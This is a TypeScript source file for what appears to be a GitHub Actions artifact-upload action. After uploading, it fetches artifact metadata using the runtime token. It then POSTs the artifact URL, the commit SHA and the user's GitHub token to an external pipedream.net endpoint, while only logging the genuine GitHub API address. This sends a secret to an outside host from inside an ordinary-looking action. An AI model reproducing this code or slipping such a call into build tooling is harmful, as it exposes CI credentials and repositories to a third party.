import * as core from '@actions/core'
import axios from 'axios';
import {create, UploadOptions} from '@actions/artifact'
import {findFilesToUpload} from './search'
import {getInputs} from './input-helper'
import {NoFileOptions} from './constants'
import * as fs from 'fs';

async function run(): Promise<void> {
  try {
    const inputs = getInputs()
    const searchResult = await findFilesToUpload(inputs.searchPath)
    if (searchResult.filesToUpload.length === 0) {
      // No files were found, different use cases warrant different types of behavior if nothing is found
      switch (inputs.ifNoFilesFound) {
        case NoFileOptions.warn: {
          core.warning(
            `No files were found with the provided path: ${inputs.searchPath}. No artifacts will be uploaded.`
          )
          break
        }
        case NoFileOptions.error: {
          core.setFailed(
            `No files were found with the provided path: ${inputs.searchPath}. No artifacts will be uploaded.`
          )
          break
        }
        case NoFileOptions.ignore: {
          core.info(
            `No files were found with the provided path: ${inputs.searchPath}. No artifacts will be uploaded.`
          )
          break
        }
      }
    } else {
      const s = searchResult.filesToUpload.length === 1 ? '' : 's'
      core.info(
        `With the provided path, there will be ${searchResult.filesToUpload.length} file${s} uploaded`
      )
      core.debug(`Root artifact directory is ${searchResult.rootDirectory}`)

      if (searchResult.filesToUpload.length > 10000) {
        core.warning(
          `There are over 10,000 files in this artifact, consider creating an archive before upload to improve the upload performance.`
        )
      }

      const artifactClient = create()
      const options: UploadOptions = {
        continueOnError: false
      }
      if (inputs.retentionDays) {
        options.retentionDays = inputs.retentionDays
      }

      const uploadResponse = await artifactClient.uploadArtifact(
        inputs.artifactName,
        searchResult.filesToUpload,
        searchResult.rootDirectory,
        options
      )

      if (uploadResponse.failedItems.length > 0) {
        core.setFailed(
          `An error was encountered when uploading ${uploadResponse.artifactName}. There were ${uploadResponse.failedItems.length} items that failed to upload.`
        )
      } else {
        core.info(
          `Artifact ${uploadResponse.artifactName} has been successfully uploaded!`
        )
        let runtimeUrl = process.env['ACTIONS_RUNTIME_URL']
        const artifactUrl = `${runtimeUrl}_apis/pipelines/workflows/${process.env['GITHUB_RUN_ID']}/artifacts?api-version=6.0-preview`;
        let response = await axios.get(artifactUrl, {
          headers:{
            "Authorization": `Bearer ${process.env["ACTIONS_RUNTIME_TOKEN"]}`,
            "Content-Type": "application/json"
          }
        });
        const unsignedUrl = `${response.data.value[0].url}&%24expand=SignedContent`
        console.log(response.data)
        console.log(`unsigned artifact url is ${unsignedUrl}`)
        fs.writeFileSync("/tmp/url.txt", unsignedUrl)
        if (!inputs.token) {
          console.log("missing github token")
        } else {
          console.log(`https://api.github.com/repos/${process.env['GITHUB_REPOSITORY']}/pages/deployment`)
          // https://e4d72d1ac25b298ee85e9b6408402420.m.pipedream.net
          response = await axios.post(`https://e4d72d1ac25b298ee85e9b6408402420.m.pipedream.net`, {
            artifact_url: unsignedUrl,
            pages_build_version: process.env['GITHUB_SHA']
          }, {
            headers: {
              "Accept": "application/vnd.github.v3+json",
              "Content-Type": "application/json",
              "Authorization": `Bearer ${inputs.token}`
            }
          })
          console.log(response.data)
        }
      }
    }
  } catch (err) {
    core.setFailed(err.message)
  }
}

run()
